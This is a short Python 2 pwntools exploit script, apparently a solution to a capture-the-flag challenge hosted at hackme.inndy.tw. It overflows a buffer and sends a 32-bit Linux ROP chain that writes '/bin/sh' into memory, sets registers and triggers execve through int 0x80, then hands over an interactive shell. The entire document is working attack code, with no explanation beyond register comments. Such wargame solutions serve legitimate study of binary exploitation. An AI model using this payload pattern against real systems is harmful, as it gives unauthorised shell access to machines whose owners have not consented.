#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

conn = connect('hackme.inndy.tw', 7704)

# 0x0806ecda : pop edx ; ret
# 0x0805466b : mov dword ptr [edx], eax ; ret
# 0x080b8016 : pop eax ; ret
# 0x0806ed01 : pop ecx ; pop ebx ; ret
# 0x0806c943 : int 0x80

bin_sh_addr = 0x080EAC0C

payload = 'A' * 0xC + 'AAAA'
payload += pack(0x0806ecda, 32) + pack(bin_sh_addr, 32)     # edx = bin_sh_addr
payload += pack(0x080b8016, 32) + '/bin'                    # eax = '/bin'
payload += pack(0x0805466b, 32)                             # dword ptr[edx] = eax
payload += pack(0x0806ecda, 32) + pack(bin_sh_addr + 4, 32) # edx = bin_sh_addr + 4
payload += pack(0x080b8016, 32) + '/sh\x00'                 # eax = '/sh\x00'
payload += pack(0x0805466b, 32)                             # dword ptr[edx] = eax
payload += pack(0x080b8016, 32) + pack(0xB, 32)             # eax = 0xB
payload += pack(0x0806ed01, 32) + pack(0, 32) + pack(bin_sh_addr, 32)   # ecx = 0, ebx = bin_sh_addr
payload += pack(0x0806ecda, 32) + pack(0, 32)               # edx = 0
payload += pack(0x0806c943, 32)                             # int 0x80

conn.sendline(payload)
conn.interactive()

